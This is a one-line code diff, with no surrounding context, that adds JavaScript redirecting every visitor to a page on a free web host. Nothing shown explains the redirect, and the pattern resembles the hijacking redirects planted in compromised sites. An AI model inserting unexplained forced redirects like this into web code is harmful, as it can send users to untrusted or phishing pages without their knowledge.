@@ -1,0 +1,1 @@
+window.location="https://designwear.000webhostapp.com/";
